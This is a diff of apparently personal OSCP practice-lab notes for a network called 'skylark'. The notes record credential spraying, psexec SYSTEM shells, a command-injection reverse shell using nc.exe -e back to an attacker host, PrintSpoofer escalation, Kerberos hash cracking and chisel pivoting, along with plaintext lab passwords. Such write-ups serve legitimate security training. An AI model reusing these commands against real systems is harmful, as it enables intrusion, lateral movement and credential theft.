@@ -3,14 +3,14 @@
 
 .223 - local + proof - done
 .225 - local + proof - done
-.221 - local + proof - done 
+Austin01 - .221 - local + proof - done 
 .11 - proof
 .13 - proof
-.220  - local + proof
-.250  - local + proof
+Houston01 - .220  - local + proof
+DC - .250  - local + proof
 .226 - local + proof - done
-.222 - local
-.227 - proof
+PARIS03 - .222 - local
+Sydney08 - .227 - proof
 .15 - local + proof
 .110 - local + proof 
 .111 - local + proof 
@@ -33,9 +33,44 @@
 | ann.sales           | B9aL9lbDOlNkGmJxusmi                 |
 | Hitoshi@skylark.com | ganbatteyo!123                       |
 | legacy              | I_Miss_Windows3.1                    |
-223 > 225 > 221 > 226 > 224 (32, 30, 31) > 
+| backup_service      | It4Server                            |
+| skylark             | User+dcGvfwTbjV[]                    |
+|                     |                                      |
+223 > 225 > 221 > 226 > 224 (32, 30, 31) > 220 > 11 > 13 > 250 > 222 > 227
 ## 192 Networks 
 250 (prep),  220, 221, 222, 223, 224, 225, 226, 227
+
+### 220
+1. Found smb creds. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/skylark]
+└─$ netexec smb 192.168.203.220 -u user -p pass    
+SMB         192.168.203.220 445    HOUSTON01        [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)
+```
+
+2. Impacket-psexec login and rooted. 
+```
+impacket-psexec backup_service:It4Server@192.168.203.220                                
+Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.203.220.....
+[*] Found writable share ADMIN$
+[*] Uploading file mQhqpJCF.exe
+[*] Opening SVCManager on 192.168.203.220.....
+[*] Creating service RYFq on 192.168.203.220.....
+[*] Starting service RYFq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
 
 ### 221
 1. Port scan
@@ -143,7 +178,7 @@ netsat -ano = shows internal network port 40000 running
 
 All as script, including a listener
 kali - ./linproxy -selfcert, start, add listener 
-client - .\agent.exe -connect 192.168.45.226:11601 -ignore-cert
+client - .\agent.exe -connect 192.168.45.202:11601 -ignore-cert
 kali - sudo ip route del 10.10.121.0/24 dev ligolo
 
 listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
@@ -151,8 +186,7 @@ listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
 
 5. Obtained reverse shell as root. 
 ```
-conf> write_config 123';C:\Users\kiosk\nc64.exe 192.168.156.221 1235 -e cmd '123
-
+conf> write_config 123';C:\Users\kiosk\nc.exe 192.168.203.221 1235 -e cmd '123
 
  nc -lvnp 80            
 listening on [any] 4444 ...
@@ -162,6 +196,30 @@ Microsoft Windows [Version 10.0.20348.1249]
 
 C:\Windows\system32>
 ```
+
+6. Post-exploitatation - Privesc to domain from local administrator. 
+```
+PS C:\Users\kiosk> .\PrintSpoofer64.exe -i -c powershell.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell
+
+PS C:\Windows\system32whoami
+whoami
+nt authority\system
+```
+
+7. Kerberoast hash and carck it. 
+```
+PS C:\Users\kiosk> .\Rubeus.exe asreproast /nowrap
+
+sudo hashcat -m 13100 backup_service.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
+
+$krb5tgs$23$*backup_service$SKYLARK.com$AUSTIN02/backup_service.SKYLARK.com:6000@SKYLARK.com*$fe13e21f05729c3b6b9e5f99c173fc22$c9b61672045a907cec36716967692b0e39421a1842bc82739635030fd52769aeab8737fad24be9fc89ed93a4ebb14c4d53740feebd2778f955031892672934db7154b65e3a5aeebe8897c306566f68e2200ee80c77279d9ae0c92949bf3596c96ceceb9e5f3abd46ec8489742920456fd9af7222a9b6cb1bc5b7fbec09c7893669625f7573f7b21908008e17e989ac9f8c7f76372fbbcdd8af488dcae32c511f205b8993832600dd949d59ca2807ad7ab55449fe11fedc5bd33b6b879df9d6832d8c0f37aa3d60fc0ab56dfcce298d992fb5fad5b31e7d4dc651f2f78e63cb3b64b31c18aa9a1b24cb5e4627c39c8179c024cb519d5fb7a00ab8d9c4edf0617fb28da2a72ce7244e6c452ec9fdf1785e8da5eebd78c1e6bb3a917978dc4662b3e9e2e5a2c76b1e6525e305ab078b22c7ac92091b2582ed796a51d260685dcaa698a49bdf35f861e7be958dff11a77c8c434dd1ef8d6bd9048a65e62b931bef3aa2229511bd40fd0346182c063a5ec4bf4c62f8ecbb3aa1d2211cc52f8fe839cc120981094ce40a93ac91d138da4e32ebd6356cf1afe8949d867fec23337f3659d435cef068ba5d7d14bc9755a7946e6b05b630da9c1b8a2fc39468861e49f853b94ceef7f5f537785633d9d24bb441f4040e9622c2481d0f072f7e26ab70d2f224e935d904acf143709cc051a5785f611a583d02e0b1f6f5d5f002e18d30ad6251b47dbe761ccd444c4b90f5857a43fdde414117123910d038bc5a8c771dd148fc3cfda56b174bb9ceb084ff503a81b36eab15072071166eb375ae2e377a758921c70d7a7ad097706f4674b62d970820391ad8a576fdaec22f6abe8b8b14f905cada38d1918c169bf398221a9c7f148115be97549e934fd9cb94e8df5c019e1024dee87b909493e3e8266686b62c3a79cf10b94f770bf427ecef317b5cc9a4fceec639a58a4106c46ebb066ed6a98c10631fa531471d0fe2673ef379d18be9acbd84155c24663492af29cd2cac4bebfa1891ee16c5a98ad6ed360ccf351fec9f4a0d43b6b13dbf637e4421bc3ecb54c0bee6b6bcc39966bf0ba5479b61909d60ae49501012a919884a28b441ec5c048478d2d8531aeda68a2d91a60d09b5a14232467245365a441e892812746f1b55c80227c6de0ead74bd2f9e14bfec4e1f2b75d33743f697ef7813c9eece68f058e3c83445f7049527b26072d7297dcb79260bf627fdbadf83ceaff96e611903c928bb832b92a7c655a16698127b3395f84bbab773a44cf39a4eaadf230c6125edbbd71ae965669657529ca2c7a00f60862f70d940dbbd93b504c80d0f5b3d13f7baa395aaedd08a899ba1181c5996bac784814b7e2e0d186a0d137ad89e016aa54c11b4c5a0e30c77c8e0de531e65e9159d977f778b1b8a38bbcb1193882a85e7fac8ba5684ead085ba068217c79194f07bd50c7aff8aa37f86b5958e197d373634a5ed3af5c6b8162a8f12bd4f0c5a6658de9cc2e70c1b9c08f4d501c42575eb9c46e44e47a9441bf81803a894bfb149273c60c6da73289fca428f49cdd9b3b7e4f1631625db443b6d9fcf5ae82bd37e6e45c3e07d2502af3233e7539b62bfbaaaf730493090e7be2114604d56720cc21e69500eafc62189a35a9c7c77bdbf5c:It4Server
+```
+
 
 
 ### 222
@@ -252,6 +310,26 @@ userid=j.jones
 passwd=ChangeMePlease__XMPPTest
 ```
 
+4. Get password from DC and rooted. 
+```
+netexec smb 192.168.164.222 -u user -p MusingExtraCounty98 
+SMB         192.168.164.222 445    PARIS03          [+] paris03\Administrator:MusingExtraCounty98 (Pwn3d!)
+
+impacket-psexec Administrator:MusingExtraCounty98@192.168.164.222
+Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.164.222.....
+[*] Found writable share ADMIN$
+[*] Uploading file sMuXehAK.exe
+[*] Opening SVCManager on 192.168.164.222.....
+[*] Creating service eTTC on 192.168.164.222.....
+[*] Starting service eTTC.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1311]
+(c) Microsoft Corporation. All rights reserved.                             
+                                                                            
+C:\Windows\system32> 
+```
 
 #### 223
 
@@ -647,6 +725,140 @@ Uname: Hitoshi@skylark.com
 Notes:
 ```
 
-## 10 Networks 
-250, 10, 12, 13, 14, 15, 110, 111 
+### 227
+1. Found rdp port and login and rooted. 
+```
+PORT     STATE SERVICE       REASON
+80/tcp   open  http          syn-ack
+3389/tcp open  ms-wbt-server syn-ack
 
+┌──(kali㉿kali)-[~/OSCP/labs/skylark]
+└─$ xfreerdp /cert-ignore /v:192.168.164.227 /u:Administrator /p:DowntownAbbey1923
+```
+
+
+## 10 Networks 
+10, 12, 13, 14, 15, 110, 111 
+
+Connection to internal network. 
+```
+In local - 
+──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ ./chisel-l server -p 8080 --reverse
+2024/06/04 21:34:01 server: Reverse tunnelling enabled
+2024/06/04 21:34:01 server: Fingerprint i/ylr6BaE4eA4Dtn2mDqb26VqBqDaYL05UEJhFVtyYQ=
+2024/06/04 21:34:01 server: Listening on http://0.0.0.0:8080
+2024/06/04 21:34:33 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+
+In 220 
+PS C:\Users\Administrator\Desktop> iwr -uri http://192.168.45.194/chisel-w -Outfile chisel.exe
+.\chisel.exe client 192.168.45.194:8080 R:1080:socks 
+PS C:\Users\Administrator\Desktop> .\chisel.exe client 192.168.45.194:8080 R:1080:socks
+2024/06/04 18:34:32 client: Connecting to ws://192.168.45.194:8080
+2024/06/04 18:34:37 client: Connected (Latency 2.1558091s)
+
+
+Use lingolo - no fancy just as usual and set up it. 
+```
+
+### 11
+1. Smb port open and use existing creds to login. Rooted 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/skylark]
+└─$ proxychains impacket-psexec backup_service:It4Server@10.10.124.11
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
+[*] Requesting shares on 10.10.124.11.....
+[*] Found writable share ADMIN$
+[*] Uploading file YPTRPlde.exe
+[*] Opening SVCManager on 10.10.124.11.....
+[*] Creating service ulsy on 10.10.124.11.....
+[*] Starting service ulsy.....
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
+[!] Press help for extra shell commands
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
+Microsoft Windows [Version 10.0.20348.1249]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+```
+
+2. Post-exploitation. 
+```
+C:\backup> type file.txt
+Skylark partner portal
+
+skylark:User+dcGvfwTbjV[]
+```
+
+## 13 
+```
+impacket-psexec backup_service:It4Server@10.10.124.13
+```
+
+### 250 
+```
+ impacket-psexec backup_service:It4Server@10.10.124.250
+
+C:\> type credentials.txt
+Local Admin Passwords:
+
+- PARIS: MusingExtraCounty98
+- SYDNEY: DowntownAbbey1923
+
+```
+
+### 10 
+1. From 220 - decrypt a credentials. 
+```
+1. Transfer to local machine from 220
+C:\Program Files\uvnc bvba\UltraVNC> ultravnc.ini
+
+2. decryt it - https://discord.com/channels/780824470113615893/1087927556604432424/1247782220375134280
+
+msf6 > rib
+[-] Unknown command: rib
+msf6 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+irb: warn: can't alias jobs from irb_jobs.
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+=> "\x17Rk\x06#NX\a"
+>> require 'rex/proto/rfb'
+=> true
+>> Rex::Proto::RFB::Cipher.decrypt ["BFE825DE515A335BE3"].pack('H*'), fixedkey
+=> "R3S3+rcH"
+>> exit
+```
+
+2. VNC login 
+```
+vncviewer 10.10.124.10:5901
+Connected to RFB server, using protocol version 3.8
+Performing standard VNC authentication
+Password: 
+Authentication successful
+Desktop name "rd:1 (research)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+```
+
+3. Rooted with SUDO 'ip' binary. 
+
+
+
+From here next one is 14 which is in another subnet so, I stopped here. 
